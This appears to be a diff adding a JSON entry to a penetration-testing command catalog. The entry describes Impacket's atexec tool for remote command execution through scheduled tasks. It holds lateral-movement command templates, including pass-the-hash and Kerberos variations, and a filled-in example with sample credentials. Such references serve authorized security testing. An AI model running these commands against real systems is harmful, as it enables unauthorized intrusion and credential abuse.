@@ -1,0 +1,20 @@
+{
+  "id": "impacket-atexec",
+  "name": "Impacket atexec.py (Scheduled Task)",
+  "command": "impacket-atexec '<domain>/<user>:<password>@<target>' '<command>'",
+  "description": "One-shot command execution by creating, running, and deleting a scheduled task over MS-TSCH. Output is captured from \\\\127.0.0.1\\ADMIN$. Requires local admin.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["smb", "rpc"],
+  "tags": ["impacket", "atexec", "lateral-movement", "scheduled-task"],
+  "variations": [
+    { "label": "Pass-the-Hash", "requires": "hash", "command": "impacket-atexec -hashes :<nt-hash> '<domain>/<user>@<target>' '<command>'" },
+    { "label": "Kerberos", "requires": "ticket", "command": "impacket-atexec -k -no-pass '<domain>/<user>@<target>' '<command>'" }
+  ],
+  "references": [
+    { "title": "Impacket atexec", "url": "https://github.com/fortra/impacket/blob/master/examples/atexec.py" }
+  ],
+  "examples": [
+    "impacket-atexec corp.local/jdoe:'Password123!'@10.10.10.10 'whoami /all'"
+  ]
+}
